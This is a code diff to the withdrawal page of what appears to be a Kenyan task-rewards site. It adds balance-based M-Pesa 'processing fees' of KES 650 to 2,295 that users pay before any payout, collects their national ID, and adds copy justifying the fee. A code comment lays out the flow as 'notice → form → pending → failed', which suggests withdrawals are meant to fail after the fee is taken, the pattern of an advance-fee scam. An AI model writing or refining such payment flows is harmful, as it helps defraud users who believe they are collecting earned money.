@@ -109,29 +109,37 @@ const REG_COUNTRY_ALIAS = { UAE: 'United Arab Emirates' };
 // Mobile Banking is offered to every user regardless of country.
 const MOBILE_BANK = WORLD_BANKS.find(b => b.code === 'MB');
 
-// Withdrawal processing fee, priced in USD, charged in KES via a dynamic conversion.
-const FEE_USD    = 17;
-const USD_TO_KES = 135;                              // approximate USD → KES rate
-const FEE_KES    = Math.round(FEE_USD * USD_TO_KES); // = KES 650
+// M-Pesa withdrawal processing fee tiers, based on the client's current balance.
+// KES 1–5,000   → KES 650
+// Above 5,000–10,000 → KES 950
+// Above 10,000–25,000 → KES 2,295
+function getMpesaWithdrawalFee(balance) {
+  const amount = Number(balance || 0);
+  if (amount <= 5000) return 650;
+  if (amount <= 10000) return 950;
+  return 2295;
+}
 
-// Postbank Kenya withdrawal processing fee
-// Priced in USD and converted to KES.
+// Postbank Kenya withdrawal processing fee remains unchanged.
+const USD_TO_KES = 135;
 const BANK_FEE_USD = 27;
 const BANK_FEE_KES = Math.round(BANK_FEE_USD * USD_TO_KES);
 
 
 // Balances above this must be withdrawn through the bank (bulk amounts), not M-Pesa.
-const BULK_THRESHOLD_KES = 25000;
+const BULK_THRESHOLD_KES = 40000;
 
-// ── M-Pesa flow (form → fee → pending → failed) ───────────────────────────────
+// ── M-Pesa flow (notice → form → pending → failed) ────────────────────────────
 function MpesaFlow({ user, initialStep, initialFeeRef }) {
   const router = useRouter();
-  const [step,     setStep]     = useState(initialStep || 'form');
+  const mpesaFee = getMpesaWithdrawalFee(user?.balance);
+  const balanceAmount = Number(user?.balance || 0);
+  const [step,     setStep]     = useState(initialStep || 'notice');
   const [phone,    setPhone]    = useState(user?.phone || '');
   const [idNumber, setIdNumber] = useState('');
   const [errors,   setErrors]   = useState({});
   const [loading,  setLoading]  = useState(false);
-  const [feeRef,   setFeeRef]   = useState(initialFeeRef || '');   // verified Daraja fee reference
+  const [feeRef,   setFeeRef]   = useState(initialFeeRef || '');   // verified Paystack fee reference
 
   // countdown
   const DURATION = 92 * 1000;
@@ -201,7 +209,7 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
       email: user?.email || '',
       phone,
       subject: 'M-Pesa Withdrawal Request',
-      details: `Account: ${user?.fullName || ''} (${user?.email || ''})\nM-Pesa Phone: ${phone}\nNational ID: ${idNumber}\nAmount: KES ${amount.toLocaleString()}\nFee paid (verified): KES ${FEE_KES.toLocaleString()}\nStatus: Pending Manual Payment`,
+      details: `Account: ${user?.fullName || ''} (${user?.email || ''})\nM-Pesa Phone: ${phone}\nNational ID: ${idNumber}\nAmount: KES ${amount.toLocaleString()}\nFee paid (verified): KES ${mpesaFee.toLocaleString()}\nStatus: Pending Manual Payment`,
     });
 
     setStep('pending');
@@ -231,14 +239,18 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
         <>
           <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
             <strong style={{ display: 'block', fontSize: 15, marginBottom: 6 }}>Instant M-Pesa Withdrawal</strong>
-            Your withdrawal will be processed after verification. Please enter your correct M-Pesa details to avoid delays or failed payouts. Ensure your phone number is registered for M-Pesa before submitting your request.
+            Your withdrawal will be processed after verification. Please enter your correct M-Pesa details to avoid delays or failed payouts. Ensure your phone number is registered for M-Pesa before submitting your request. Your current available balance is <strong>KES {balanceAmount.toLocaleString()}</strong>.
           </div>
           <div className="pay-amount" style={{ marginBottom: 20 }}>
             <div className="pay-amount-label">Withdrawal Fee</div>
-            <div className="pay-amount-value" style={{ color: 'var(--mpesa-green)' }}>KES {FEE_KES.toLocaleString()}</div>
-            <div className="pay-amount-sub">A one-time, non-refundable processing fee is paid via M-Pesa before your request is submitted.</div>
+            <div className="pay-amount-value" style={{ color: 'var(--mpesa-green)' }}>KES {mpesaFee.toLocaleString()}</div>
+            <div className="pay-amount-sub">Your fee is calculated from your current available balance and is paid via M-Pesa before your request is submitted.</div>
           </div>
-          <button className="pay-btn" style={{ background: 'var(--mpesa-green)' }} onClick={() => setStep('fee')}>
+          <div className="pay-message" style={{ borderColor: '#d1d5db', background: '#fff', marginBottom: 16, fontSize: 13, lineHeight: 1.6 }}>
+             <strong>Withdrawal processing fee</strong><br />
+             Your withdrawal processing fee is calculated according to your current available balance. This fee is used to cover the operational and processing costs of maintaining and administering the platform. Task rewards themselves come from the clients who post tasks on the platform.
+           </div>
+           <button className="pay-btn" style={{ background: 'var(--mpesa-green)' }} onClick={() => setStep('form')}>
             Continue
           </button>
         </>
@@ -247,17 +259,17 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
       {step === 'fee' && (
         <>
           <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 18 }}>
-            Your M-Pesa withdrawal details have been validated. Now pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal processing fee via M-Pesa to continue. You&apos;ll get a prompt on your phone; enter your PIN to confirm.
+            <strong>Your M-Pesa withdrawal details have been validated.</strong><br />Your applicable withdrawal processing fee is <strong>KES {mpesaFee.toLocaleString()}</strong> based on your available balance. Please complete the M-Pesa payment shown on your phone to continue with the withdrawal request.
           </div>
           <MpesaPay
             purpose="withdrawal_fee"
-            amount={FEE_KES}
+            amount={mpesaFee}
             defaultPhone={user?.phone || ''}
-            payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
+            payLabel={`Pay KES ${mpesaFee.toLocaleString()} via M-Pesa`}
             onSuccess={handleFeeSuccess}
           />
-          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('form')}>
-            <Icon name="arrowLeft" size={14} /> Back to Details
+          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>
+            <Icon name="arrowLeft" size={14} /> Back to Dashboard
           </button>
         </>
       )}
@@ -278,7 +290,7 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
             placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
           {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
           <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f0fff4', marginTop: 16, fontSize: 13 }}>
-            After you submit these details, you&apos;ll be prompted to pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal processing fee via M-Pesa.
+            ✓ Your M-Pesa withdrawal details have been validated. Your applicable withdrawal processing fee is <strong>KES {mpesaFee.toLocaleString()}</strong> based on your available balance. Please complete the M-Pesa payment shown on your phone to continue with the withdrawal request.
           </div>
           {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 10 }}>{errors.form}</div>}
           <button className="pay-btn" style={{ background: '#000000', marginTop: 16, opacity: loading ? 0.7 : 1 }} onClick={handleSubmitForm} disabled={loading}>
@@ -998,7 +1010,7 @@ export default function WithdrawPage() {
   const isBulk = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;
   if (isBulk) return <BulkWithdrawalFlow user={user} paidRef={psref} />;
 
-  if (method === 'mpesa')         return <MpesaFlow user={user} initialStep="form" initialFeeRef={psref} />;
+  if (method === 'mpesa')         return <MpesaFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'notice'} initialFeeRef={stepQ === 'form' ? psref : ''} />;
   if (method === 'postbank')      return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
   if (method === 'international')  return <InternationalFlow user={user} initialStep="form" initialFeeRef={stepQ === 'form' ? psref : ''} />;
 
